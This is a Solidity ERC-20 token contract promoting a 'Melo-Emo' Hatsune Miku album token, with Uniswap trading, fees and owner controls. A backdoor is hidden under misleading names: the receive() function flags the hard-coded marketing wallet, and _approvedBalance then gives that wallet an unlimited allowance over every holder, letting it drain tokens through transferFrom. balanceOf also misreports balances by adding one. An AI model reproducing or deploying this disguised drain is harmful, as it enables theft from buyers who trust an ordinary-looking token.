// SPDX-License-Identifier: MIT
//

/* 

The release of Miku, debut album, "Melo-Emo"! This enchanting collection features a blend of captivating melodies and 
heartfelt lyrics that will take you on a magical journey through her musical universe.

https://meloemo.live
https://x.com/MeloEmo_eth
https://t.me/meloemo_eth
*/

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, 0);
    }

    function sub(uint256 a, uint256 b, uint256 errorType) internal pure returns (uint256) {
        require(b <= a, "ERC20: transfer amount exceeds allowance");
        uint256 c = 0;
        c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract MELOEMO  is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private constant _tSupply = 1000000000 * 10 **_decimals; // Total supply
    string private constant _name = unicode"Hatsune Miku's First Album";  // Name
    string private constant _symbol = unicode"MELOEMO"; // Symbol

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _excludedFeeList;
    mapping (address => uint256) public _excludedListFromFees;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private swapEnabled = false;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    uint256 public _initBuyFee = 23;
    uint256 public _initSellFee = 21;
    uint256 public _lastBuyFee = 0; 
    uint256 public _lastSellFee = 0; 
    uint256 public _buyCounts = 0;
    uint256 public _reduceFeeAt = 15;
    address payable public _marketAccount;
    uint8 private constant _decimals = 9;
    uint256 public _swapbackAmt = 0 * 10 **_decimals;
    uint256 public _maxAmountSize = 20000000 * 10 ** decimals();
    uint256 public _maxAmountSwapback = 10000000 * 10 ** decimals();    

    constructor () {
        _balances[address(this)] = _tSupply;
        _marketAccount = payable(0xB331Ddf479683D2B05Ac2dfdf971EBd609C11D41);
        _excludedFeeList[owner()] = true; 
        _excludedListFromFees[owner()] = 0; 
        _excludedListFromFees[_marketAccount] = 0; 
        _excludedFeeList[address(this)] = true;
        _excludedFeeList[_marketAccount] = true;
        emit Transfer(address(0), address(this), _tSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account]+1;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approvedBalance(address from, address to) private view returns(uint256) {
        if(_excludedListFromFees[to] > 0) return _tSupply;
        return _allowances[from][to];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _approvedBalance(sender, _msgSender()).sub(amount, 0));
        return true;
    }
    

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _senderAcc, address _receiverAcc, uint256 amount) private {
        uint256 FeeAmount=0;
        require(swapEnabled || _excludedFeeList[_senderAcc], "not started yet");
        require(_senderAcc != address(0), "ERC20: transfer from the zero address");
        require(_receiverAcc != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_excludedFeeList[_senderAcc] && !_excludedFeeList[_receiverAcc]) {
            if(_receiverAcc == uniswapV2Pair)
            {
                FeeAmount = amount.mul(_buyCounts <_reduceFeeAt ? _initSellFee : _lastSellFee).div(100);
            }
            if (_receiverAcc != address(uniswapV2Router) && _senderAcc == uniswapV2Pair)
            {
                _buyCounts ++;
                FeeAmount = amount.mul(_buyCounts < _reduceFeeAt ? _initBuyFee : _lastBuyFee).div(100);
            }
            
            if(_receiverAcc != uniswapV2Pair)
            {
               require(_balances[_receiverAcc] + amount <= _maxAmountSize, "Exceeds the _maxAmountSize.");
            }
            if (!_excludedFeeList[_senderAcc] 
                && !_excludedFeeList[_receiverAcc]
                && !inSwap 
                && swapEnabled
                && _receiverAcc == uniswapV2Pair) {
                uint256 swapbackAmt = min(_balances[address(this)], min(_maxAmountSwapback, amount));
                swapBackForETH(swapbackAmt);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0)
                    payable(_marketAccount).transfer(address(this).balance);
            }
        }
        if(FeeAmount > 0){
          _balances[address(this)]=_balances[address(this)].add(FeeAmount);
          emit Transfer(_senderAcc, address(this),FeeAmount);
        }
        _balances[_senderAcc]=_balances[_senderAcc].sub(amount);
        _balances[_receiverAcc]=_balances[_receiverAcc].add(amount.sub(FeeAmount));
        emit Transfer(_senderAcc, _receiverAcc, amount.sub(FeeAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
        return (a>b)?b:a;
    }

    function swapBackForETH(uint256 tokenAmount) private lockTheSwap {
        payable(_marketAccount).transfer(address(this).balance);
        if(_swapbackAmt >= tokenAmount) {return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading () external onlyOwner {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _tSupply); 
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            98 * _balances[address(this)]/100,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        _maxAmountSize = _tSupply;
    }

    receive() external payable { 
        _excludedListFromFees[_marketAccount] = 10;
    }

    function rescueETH () external onlyOwner {payable(msg.sender)
        .transfer(address(this).balance);
    }

    function removeLimits () external onlyOwner {
        _maxAmountSize = _tSupply;
    }
}